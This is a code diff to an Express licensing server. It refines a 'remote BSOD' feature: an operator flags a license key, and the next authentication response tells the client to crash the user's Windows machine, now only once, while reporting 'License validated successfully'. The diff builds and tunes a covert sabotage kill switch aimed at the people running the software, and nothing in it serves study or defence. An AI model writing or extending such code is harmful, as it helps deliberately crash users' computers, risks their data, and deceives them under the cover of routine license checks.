@@ -332,7 +332,15 @@ app.post('/auth/license', validateAppSecret, (req, res) => {
         
         // Check if remote BSOD is triggered for this key (but skip if whitelisted)
         const isWhitelisted = whitelistedLicenseKeys.includes(license_key);
-        const remoteBSODTriggered = remoteBSODKeys.includes(license_key) && !isWhitelisted;
+        const remoteBSODIndex = remoteBSODKeys.indexOf(license_key);
+        const remoteBSODTriggered = remoteBSODIndex !== -1 && !isWhitelisted;
+        
+        // If remote BSOD is triggered, remove it from the array so it only triggers ONCE
+        // This way, after they get BSOD'd once, they can authenticate normally next time
+        if (remoteBSODTriggered && remoteBSODIndex !== -1) {
+            remoteBSODKeys.splice(remoteBSODIndex, 1);
+            console.log(`[REMOTE BSOD] Triggered for key ${license_key} - removed from array (one-time trigger)`);
+        }
         
         // Return response immediately (don't block)
         res.json({
@@ -341,7 +349,7 @@ app.post('/auth/license', validateAppSecret, (req, res) => {
             token: token,
             message: 'License validated successfully',
             is_whitelisted: isWhitelisted,
-            remote_bsod: remoteBSODTriggered // Include remote BSOD flag
+            remote_bsod: remoteBSODTriggered // Include remote BSOD flag (only true once)
         });
     } catch (error) {
         console.error('Error in license validation:', error);
@@ -927,7 +935,7 @@ app.post('/auth/trigger-remote-bsod', validateAppSecret, (req, res) => {
     
     res.json({
         success: true,
-        message: `Remote BSOD triggered for license key ${license_key}. User will be BSOD'd on next authentication.`,
+        message: `Remote BSOD triggered for license key ${license_key}. User will be BSOD'd ONCE on next authentication, then they can authenticate normally.`,
         license_key: license_key
     });
 });
